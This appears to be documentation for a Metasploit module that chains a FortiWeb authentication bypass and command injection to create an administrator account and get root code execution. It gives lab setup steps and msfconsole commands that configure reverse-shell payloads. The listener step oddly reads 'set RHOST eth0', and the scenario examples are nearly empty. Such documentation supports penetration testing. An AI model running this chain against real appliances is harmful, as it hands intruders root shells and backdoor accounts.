## Vulnerable Application
This exploit module exploits an authentication bypass via path traversal vulnerability in the Fortinet
FortiWeb management interface to create a new local administrator user account. From there a command
injection vulnerability is leveraged to achieve RCE with root privileges.

The auth bypass `CVE-2025-64446` affects the following versions:

* FortiWeb `8.0.0` through `8.0.1` (Patched in `8.0.2` and above)
* FortiWeb `7.6.0` through `7.6.4` (Patched in `7.6.5` and above)
* FortiWeb `7.4.0` through `7.4.9` (Patched in `7.4.10` and above)
* FortiWeb `7.2.0` through `7.2.11` (Patched in `7.2.12` and above)
* FortiWeb `7.0.0` through `7.0.11` (Patched in `7.0.12` and above)

The command injection `CVE-2025-58034` affects the following versions (Note the `7.6` and `7.4` branches are very
slightly different when compared to the patch versions for `CVE-2025-64446`:

* FortiWeb `8.0.0` through `8.0.1` (Patched in `8.0.2` and above)
* FortiWeb `7.6.0` through `7.6.5` (Patched in `7.6.6` and above) *<-- slight difference*
* FortiWeb `7.4.0` through `7.4.10` (Patched in `7.4.11` and above) *<-- slight difference*
* FortiWeb `7.2.0` through `7.2.11` (Patched in `7.2.12` and above)
* FortiWeb `7.0.0` through `7.0.11` (Patched in `7.0.12` and above)

Note: Unsupported versions `6.*` are also affected. This exploit module has been confirmed to work against `6.3.9`.

## Testing
Download a suitable FortiWeb-VM image and create a new VM. When creating the VM, assign the first network interface to a
network you can target later (e.g. your external network), optionally, assign the second network interface to a private
network. Power on the VM, and login to the console with the default username `admin` and a blank password. You will be
asked to create a new admin password. Once you are at the CLI, you can assign an IP address to the management
interface (on `port1`) for your (external) network:

```
FortiWeb # config system interface 

FortiWeb (interface) # edit port1 

FortiWeb (port1) # set ip 192.168.86.200 255.255.255.0

FortiWeb (port1) # end

FortiWeb #
```

A default gateway (for example `192.168.86.1`) can be configured as follows:

```
FortiWeb # config router static
 
FortiWeb (static) # edit 0
 
FortiWeb (1) # set gateway 192.168.86.1
 
FortiWeb (1) # set device port1
 
FortiWeb (1) # end

FortiWeb #  
```

You should now be able to access the management interface via HTTPS, e.g. `https://192.168.86.200/login`.

## Options
The following advanced options do not need to be changed against a target in a default configuration.

### FortiWebAdminUsername
A valid admin username to use. A new admin account will be created if not specified. (Defaults to a random value).

### FortiWebAdminPassword
A valid admin password to use. A new admin account will be created if not specified. (Defaults to a random value).

### FortiWebAccessProfile
The access profile to use for the new admin account (Defaults to `prof_admin`).

### FortiWebDomain
The domain to use for the new admin account (Defaults to `root`).

### FortiWebDefaultAdminAccount
The default FortiWeb admin account name (Defaults to `admin`).

### FortiWebWritableDir
The full path of a writable directory on the target (Defaults to `/tmp`).

## Verification Steps

1. Start msfconsole
2. `use exploit/linux/http/fortinet_fortiweb_rce`

Configure the target:

3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_HTTP_OR_HTTPS_PORT>` (If different from the default of 443)
5. `set SSL true` (Or set to false if targeting HTTP)
6. `set target 0` (Target `0` is against FortiWeb `8.*` and `7.*`. Target `1` is against FortiWeb `6.*`)

Configure the payload to execute:

7. `set PAYLOAD cmd/unix/reverse_bash`
8. `set RHOST eth0`
9. `set RPORT 4444`

_Note_: only these payloads have been verified to work against FortiWeb versions `8.*` and `7.*`:
* `cmd/unix/reverse_bash`
* `cmd/unix/reverse_openssl`

If targeting FortiWeb 6.*, this payload has been verified to work:
* `cmd/unix/reverse_bash`
* `cmd/linux/http/x64/meterpreter_reverse_tcp`

Run the module:

10. `check`
11. `exploit`

## Scenarios

### Example 1 (CVE-2025-64446 + CVE-2025-58034, against FortiWeb 8.0.1)

In this example, `CVE-2025-64446` is used to create a new admin account and then `CVE-2025-58034` is used
to execute a payload. This chain gives unauthenticated RCE and is the default operation of the exploit module.

```
msf > use exploit/linux/http/fortinet_fortiweb_rce

### Example 2 (CVE-2025-58034, against FortiWeb 8.0.1)

In this example, the attacker has existing admin credentials, so only `CVE-2025-58034` is used
to execute a payload.

### Example 3 (CVE-2025-64446 + CVE-2025-58034, against FortiWeb 6.3.9)

In this example we are targeting an older unsupported version of FortiWeb, `6.3.9`. To do this we must change the 
exploit target from `0` to `1`, and choose either a Linux or a Unix payload.
